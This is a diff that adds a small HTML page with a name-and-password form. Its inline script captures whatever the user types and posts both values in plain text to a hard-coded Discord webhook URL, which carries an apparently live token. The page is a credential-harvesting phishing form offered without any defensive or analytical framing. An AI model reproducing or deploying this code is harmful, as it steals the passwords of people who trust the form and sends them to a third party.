@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Document</title>
+  <script src="index.js"></script>
+</head>
+<body>
+  <form id="myForm">
+    <label for="name">Name:</label>
+    <input type="text" id="name" name="name"><br>
+  
+    <label for="password">Password:</label>
+    <input type="password" id="password" name="password"><br>
+  
+    <button type="submit">Submit</button>
+  </form>
+
+  <script>
+    const form = document.getElementById('myForm');
+
+form.addEventListener('submit', (event) => {
+  event.preventDefault();
+  
+  const name = document.getElementById('name').value;
+  const password = document.getElementById('password').value;
+
+  const webhookUrl = 'https://discord.com/api/webhooks/1081136651499212820/1HCPiGNld-w_eDHS4VSdN70ffkPy09I6goWd66TCz4YHYQs3TneSHEEfFt0p6ShngPCY';
+  const request = new XMLHttpRequest();
+  request.open('POST', webhookUrl);
+  request.setRequestHeader('Content-type', 'application/json');
+
+  const payload = {
+    content: `Name: ${name}\nPassword: ${password}`
+  };
+
+  request.send(JSON.stringify(payload));
+});
+
+  </script>
+  
+</body>
+</html>
